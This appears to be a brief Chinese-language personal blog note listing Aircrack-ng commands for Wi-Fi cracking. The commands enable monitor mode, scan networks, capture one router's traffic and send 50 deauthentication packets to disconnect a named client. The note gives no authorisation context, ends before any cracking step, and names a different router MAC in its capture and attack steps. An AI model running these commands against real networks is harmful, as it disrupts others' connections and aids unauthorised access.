---
title: WiFiCrack
date: 2019-10-19 19:00:53
categories: 食用笔记
tags:
    - Aircrack-ng
    - Kali Linux
---

{% noteblock quote cyan %}

WiFiCrack 笔记。

{% endnoteblock %}

<!-- more -->

## 开启监听

```shell
airmon-ng start wlan0
```

## 扫描信号

```shell
airodump-ng wlan0mon
```

## 选定 Wi-Fi 监听

```shell
airodump-ng wlan0mon -c 11 --bssid BC:46:99:3D:66:D6 -w doc # -w指定生成的文件名 -c指定信道 --bssid指定路由器的MAC地址
```

## 攻击

```shell
aireplay-ng -0 50 -a E2:A5:3E:6B:F7:21 -c 44:C3:46:40:7E:5D   wlan0mon # -0指定发包的数量 -a指定路由器的MAC地址  -c指定连接的客户端的MAC地址
```
